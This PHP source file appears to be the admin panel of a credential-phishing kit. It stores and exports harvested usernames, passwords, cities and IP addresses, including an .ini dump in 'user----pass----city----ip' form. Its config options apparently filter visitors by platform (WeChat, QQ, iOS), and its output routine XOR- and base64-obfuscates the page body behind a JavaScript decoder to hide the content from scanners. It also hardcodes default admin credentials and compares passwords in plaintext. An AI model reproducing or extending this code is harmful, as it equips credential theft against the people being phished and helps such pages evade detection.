<?php 
include '../app/App.php';
session_start();
//$_SESSION['conf']=db( 'ec_conf' )->where(array('user'=>'cheney'))->find();
$admin=new Admin();
//登录
$conf=db( 'ec_conf' )->find();
if(empty($_GET['m']))$_GET['m']='list';
ob_start();
if(is_file($file="./set_{$_GET['m']}.php")){
	include $file;
}else{
	echo 'Can not find the corresponding method!';
}
$html = ob_get_clean();
//$_SESSION=array();
$admin->outPut($html);
class Admin{
	public $debug	=	0;
	public $encType	=	2;
	public $pu		=	array();
	public function __construct() {
		if(! empty($_GET['act'])){
			$this->action();
		}	
		if(empty($_SESSION['conf'])){
			$this->chenckLogin();		
		}
	}
	public function action(){
		$json=array();
		if('save' == $_GET['act']){
			$this->setConfig($_POST['conf']);
			$json['err']=0;
			$json['msg']='保存成功！';
		}elseif('reset' == $_GET['act']){	
			header("Location: ?");
		}elseif('set_pass' == $_GET['act']){	
			$this->setConfig(array('user'=>$_POST['user'],'pass'=>$_POST['pass']));
			$this->clearSession();
			header("Location: ?");
		}elseif('logout' == $_GET['act']){
			$this->clearSession();
			header("Location: ?");
			exit;
		}
		header( "Content-Type:text/html;charset=utf-8 ");
		exit(json_encode($json));
	}
	public function clearSession(){
		$_SESSION['conf']=null;
	}
	public function chenckLogin(){
		if(isset($_POST['checkUser'])&&isset($_POST['checkPass'])){
			$config=db( 'ec_conf' )->where(array('user'=>$_POST['checkUser'],'pass'=>$_POST['checkPass']))->find();
			if(!empty($config)){
				$_SESSION['conf']=array_merge(array (
				  'id' => '1',
				  'user' => 'cheney',
				  'pass' => '848586',
				  'jurisdiction' => 'Ddata',
				  'datatype' => 'user=用户名&pass=密码&city=城市&ip=IP地址&domain=域名&time=时间&info=备注',
				  'dataline' => '50',
				),$config);
			}
		}
		if(empty($_SESSION['conf'])){
			include './inc_login.php';
			exit;		
		}
	}
	public function setConfig($conf){
		
		$conf = field($conf,'dataline,datatype,user,pass,datatype,title,logo,readyJump,location,confusion,otherBrowser,viewTimes,tongji,allowWeixin,allowQQ,allowIOS,allowAll,denyReady,deny,dataline,lasttype');
		db( 'ec_conf' )->where('id',$_SESSION['conf']['id'])->update($conf);
		$_SESSION['conf']=db( 'ec_conf' )->where('id',$SESSION['conf']['id'])->find();
	}
	//生成URL
	static function url($url, $obj, $deep=false){
		if(is_array($url)){
			$deep = $obj;
			$obj = $url;
			$url = '';
		}
		if($url===true){
			$urlx=explode('?',$_SERVER["REQUEST_URI"]);
			$url = $urlx[0];
		}
		if(is_array($obj)){
			if($deep){
				$obj = array_merge($_GET,$obj);
			}
			$an='?';
			foreach ($obj as $k => $v){
				if(!is_numeric($k)){
					$url .= $an .$k.'='.urlencode($v);
					$an='&';
				}
			}
		}
		return $url;
	}
	function outPut($html){
		if($this->debug){
			echo($html);
		}else{
			echo(preg_replace_callback('/(<body.*?>)([\W\w]+)(<\/body.*?\s*>)/i',array($this,'jiamiPreg'),$html));
		}
	}
	function jiamiPreg($a){
		return $a[1].$this->jiamiH5($a[2]).$a[3];
	}
	function jiamiH5($str,$class='CLASSNAME',$file=false){
		$pass = md5 ($_SERVER["HTTP_HOST"].$_SERVER['REQUEST_URI']);
		$code = '';
		$str  = base64_encode ( $str );
		$len  = strlen ( $str );    
		for($i = 0; $i < $len; $i ++)$code .= $str [$i] ^ $pass[$i % 32];
		$val=base64_encode($code).$pass;
		$val=str_replace(array('A','B','C','D','E','1','z','+','/','='),array('A ','B ','C,<br>',"D.\r\n","E!\r\n","1.\r\n",'zE0x','zE1x','zE2x','zE3x'),$val);
		$val=preg_replace('/\w{7}/','$0 ',$val);
		$val='<p>'.str_replace("\r\n","</p>\r\n<p>",$val).'</p>';
		$script="(function(){function be4(s){var c,d,e,h,j,n,r,i=0,v='',t='',o='indexOf',q='charAt',w='charCodeAt',f=String.fromCharCode,l='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';l+='0123456789+/=';while(i<s.length){c=l[o](s[q](i++));d=l[o](s[q](i++));e=l[o](s[q](i++));h=l[o](s[q](i++));j=(c<<2)|(d>>4);n=((d&15)<<4)|(e>>2);r=((e&3)<<6)|h;v=v+f(j);if(e!=64){v=v+f(n)}if(h!=64){v=v+f(r)}}c=d=i=0;while(i<v.length){c=v[w](i);if(c<128){t+=f(c);i++}else if((c>191)&&(c<224)){d=v[w](i+1);t+=f(((c&31)<<6)|(d&63));i+=2}else{d=v[w](i+1);e=v[w](i+2);t+=f(((c&15)<<12)|((d&63)<<6)|(e&63));i+=3}}return(t)}var i=0,t='',p,e=document.getElementsByClassName('{CLASSNAME}').item(0);if(!e.style)return;e.style.height='0';e.style.display='none';s=e.innerHTML;s=s.replace(/<.+?>/g,'').replace(/[^A-Za-z0-9\+\/\=]/g,'').replace(/zE([0-3])x/g,function(a,b){return['z','+','/','='][b]});p=s.slice(-32);s=s.slice(0,-32);s=be4(s);for(i=0;i<s.length;i++)t+=String.fromCharCode(s.charCodeAt(i)^p.charCodeAt(i%32));document.write(be4(t));s=t=p=''})();";
		$html="\r\n<div class=\"{CLASSNAME}\" style=\"overflow:hidden;height:500px;padding-top:1100px;\">\r\n".$val."\r\n</div>\r\n";
		if(is_string($file)){
			if(!is_file($file))file_put_contents($file,str_replace('{CLASSNAME}',$class,$script));
			$html.='<script type="text/javascript" src="'.$file.'"></script>'."\r\n";
		}else{
			$html.='<script type="text/javascript">'.$script."</script>\r\n";
		}
		$html=str_replace('{CLASSNAME}',$class,$html);
		return $html;	
	}
	function exportExcel($title=array(), $data=array(), $fileName=''){
		error_reporting(0);  
		$txt = '<!DOCTYPE html>'."\r\n";
		$txt .= '<html>'."\r\n";
		$txt .= '<head>'."\r\n";
		$txt .= '    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />'."\r\n";
		$txt .= '    <title>'.$fileName.'</title>'."\r\n";
		$txt .= '</head>'."\r\n";
		$txt .= '<body>'."\r\n";
		$txt .= '	<table border="1">'."\r\n";
		$txt .= '		<caption align="center">导出时间：'.date( 'Y-m-d H:i:s' ).'  导出说明：'.$fileName.'</caption>'."\r\n";
		$txt .= '		<tr bgcolor="#9acd32">'."\r\n";
		foreach ( $title AS $vt ) { //设置列标题  
			$txt .= '			<th align="center">'.$vt.'</th>'."\r\n";
		}
		$txt .= '		</tr>'."\r\n";
		$txt .= '		<xsl:for-each select="catalog/cd">'."\r\n";
		foreach ( $data AS $vd ) {
			$txt .= '		<tr>'."\r\n";
			foreach ( $vd AS $vi ) {
				$txt .= '			<td>'.$vi.'</td>'."\r\n";
			}
			$txt .= '		</tr>'."\r\n";
		}
		$txt .= '		</xsl:for-each>'."\r\n";
		$txt .= '	</table>'."\r\n";
		$txt .= '</body>'."\r\n";
		$txt .= '</html>'."\r\n";
		header('Content-Type: charset=utf-8');
		header('pragma:public');
		header("Content-Disposition:attachment;filename={$fileName}.xls");
		exit( $txt);
	}
	function exportSql($title=array(), $data=array(), $fileName=''){
		error_reporting(0); 
		$createarr=array(
			'id'		=> '`id` int(11) NOT NULL ,',
			'ip'		=> '`ip` varchar(50) DEFAULT NULL,',
			'user'		=> '`user` varchar(50) DEFAULT NULL,',
			'pass'		=> '`pass` varchar(50) DEFAULT NULL,',
			'title'		=> '`title` varchar(200) DEFAULT NULL,',
			'cost'		=> '`cost` varchar(50) DEFAULT NULL,',
			'phone'		=> '`phone` varchar(50) DEFAULT NULL,',
			'address'	=> '`address` varchar(200) DEFAULT NULL,',
			'content'	=> '`content` varchar(800) DEFAULT NULL,',
			'text_1'	=> '`text_1` varchar(200) DEFAULT NULL,',
			'text_2'	=> '`text_2` varchar(200) DEFAULT NULL,',
			'city'		=> '`city` varchar(50) DEFAULT NULL,',
			'date'		=> '`date` int(11) DEFAULT NULL,',
			'time'		=> '`time` datetime DEFAULT NULL,',
			'info'		=> '`info` varchar(200) DEFAULT NULL,',
			'href'		=> '`href` varchar(200) DEFAULT NULL,',		
		);
		$txt = "--\r\n";
		$txt .= '-- 导出时间：' . date( 'Y-m-d H:i:s' ) . "\r\n";
		$txt .= '-- 导出说明：' . $fileName . "\r\n";
		$txt .= "--\r\n\r\n--\r\n-- 表的结构 `datalist`\r\n--\r\nCREATE TABLE IF NOT EXISTS `datalist` (\r\n  `dataindex` int(11) NOT NULL AUTO_INCREMENT,\r\n";
		foreach ( $title AS $ck=>$ct ) { //设置列标题  
			$txt .= '  '.(isset($createarr[$ck])?$createarr[$ck]:'`'.$ck.'` varchar(800) DEFAULT NULL,')."\r\n";
		}
		$txt .= "  PRIMARY KEY (`dataindex`)\r\n) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=0 ;\r\n\r\n--\r\n-- 转存表中的数据 `datalist`\r\n--\r\nINSERT INTO `datalist` ( `dataindex` ";
		foreach ( $title AS $vk=>$vt ) { //设置列标题  
			$txt .= ' , `'.$vk.'`';
		}
		$txt .= ") VALUES \r\n";
		$endkey=count($data)-1;
		foreach ( $data AS $vl=>$vd ) {
			$txt .= "( NULL";
			foreach ( $vd AS $vi ) {
				$txt .= ", ".Query::escape($vi);
			}
			$txt .= ")".($endkey==$vl?';':',')."\r\n";
		}
		header('pragma:public');
		header("Content-Disposition:attachment;filename={$fileName}.sql");
		exit( $txt);	
	}
	function exportTxt($title=array(), $data=array(), $fileName=''){
		error_reporting(0);  
		$txt = '';
		$txt .= '导出时间：' . date( 'Y-m-d H:i:s' ) . "\r\n";
		$txt .= '导出说明：' . $fileName . "\r\n\r\n";
		foreach ( $title AS $vt ) { //设置列标题  
			$txt .= $vt . "\t";
		}
		$txt .= "\r\n";
		foreach ( $data AS $vd ) {
			foreach ( $vd AS $vi ) {
				$txt .= $vi . "\t";
			}
			$txt .= "\r\n";
		}
		header('pragma:public');
		header("Content-Disposition:attachment;filename={$fileName}.txt");
		exit( $txt);	
	}
	function exportIni( $title = array(), $data = array(), $fileName = '') {
		error_reporting(0);
		$txt='';
		foreach ( $data AS $val ) {
			$txt.= "{$val["user"]}----{$val["pass"]}----{$val['city']}----{$val['ip']}----{$val['time']}\r\n";
		}
		header('pragma:public');
		header("Content-Disposition:attachment;filename={$fileName}.ini");
		exit( $txt);		
	}
}